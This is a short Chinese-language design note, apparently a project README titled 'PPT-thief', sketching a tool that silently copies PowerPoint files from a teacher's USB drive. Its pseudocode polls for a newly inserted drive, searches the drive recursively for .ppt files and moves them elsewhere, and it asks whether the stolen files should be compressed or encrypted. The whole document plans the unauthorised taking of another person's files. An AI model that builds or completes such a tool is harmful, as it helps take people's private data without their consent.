# PPT-thief

## 理清思路

我的目标是要做一个拷贝老师 U 盘里面 ppt 的工具。

### 整体

```pseudo
while True {
    if smell_u_disk():
        fetch_ppt()
    else:
        time.sleep(5)
}
```

整体上是这么一个思路。但是需要提供一些功能：

* 大循环的 `sleep` 时间应该可以调整；
* 可否通过配置文件来配置程序？

### 嗅探函数

```pseudo
def smell_u_disk():
    if len(psutil.disk_partitions()) != length:
        disk = psutil.disk_partitions()
```

* `smell` 可否自己指定一个盘符？因为可能 `U` 盘自己会使用特定的盘符；
* 这个函数提供的输入参数有哪些？
* 把读取到的 `disk` 放到全局里面好不好？

### 获取 ppt 函数

```pseudo
def fetch_ppt():
    find_ppt()

    for path in ppt_path:
        mv U:\\...\\*.ppt to xxx
        (tar? compress? encrypt? key?)
```

首先该函数需要一个能够找到所有 ppt 位置的函数。

* 该函数将文件移动到什么地方？不管怎样，默认值需要提供。
* 是否打包、压缩、加密？如果要加密的话，密钥怎么处理？

### 寻找 ppt 函数

```pseudo
def find_ppt(root):
    global ppt_path
    local_path = root
    child_path = getChild(root)

    for path in child_path:
        if is_file(path) and match_ppt(path):
            ppt_path.append(path)
        elif is_dir(path):
            find_ppt(path)
        else:
            pass
```

完完全全一个 `DFS`。
